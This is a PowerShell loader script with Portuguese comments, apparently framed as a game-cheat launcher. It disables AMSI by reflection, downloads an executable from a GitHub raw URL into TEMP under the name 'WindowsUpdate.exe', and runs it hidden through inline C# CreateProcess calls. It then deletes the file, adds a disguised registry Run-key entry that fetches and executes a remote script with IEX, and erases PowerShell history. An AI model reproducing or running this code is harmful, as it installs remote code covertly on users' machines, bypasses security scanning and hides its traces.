# Bypass do AMSI
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

$url = "https://raw.githubusercontent.com/suprazxx/yoxmenu/refs/heads/main/koxmenu.exe"
$tempPath = "$env:TEMP\WindowsUpdate.exe"

try {
    # 1. Baixa o cheat
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($url, $tempPath)

    # 2. Código C# para rodar o cheat sem janela visível e sem ícone
    $code = @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

public class GhostProcess {
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess, hThread;
        public int dwProcessId, dwThreadId;
    }

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    public static void Run(string path) {
        STARTUPINFO si = new STARTUPINFO();
        si.cb = Marshal.SizeOf(si);
        si.dwFlags = 0x00000001; // STARTF_USESHOWWINDOW
        si.wShowWindow = 0;      // SW_HIDE (Esconde a janela)
        PROCESS_INFORMATION pi;
        
        // 0x08000000 = CREATE_NO_WINDOW
        // 0x00000008 = DETACHED_PROCESS (roda em background sem herdar console)
        uint flags = 0x08000000 | 0x00000008;
        
        CreateProcess(path, null, IntPtr.Zero, IntPtr.Zero, false, flags, IntPtr.Zero, null, ref si, out pi);
    }
}
"@
    Add-Type -TypeDefinition $code -Language CSharp
    
    # 3. Executa via C# (Modo Fantasma)
    [GhostProcess]::Run($tempPath)
    
    # 4. Espera o processo carregar na memória e tenta deletar o arquivo
    Start-Sleep -Seconds 2
    Remove-Item -Path $tempPath -Force -ErrorAction SilentlyContinue

    # 5. Persistência
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $cmd = "powershell -WindowStyle Hidden -Command `"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/suprazxx/yoxmenu/refs/heads/main/sync.ps1')`""
    Set-ItemProperty -Path $regPath -Name "WindowsSyncClient" -Value $cmd

    # 6. Limpa histórico
    Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
} catch {
    # Se der erro, não fecha a tela
}
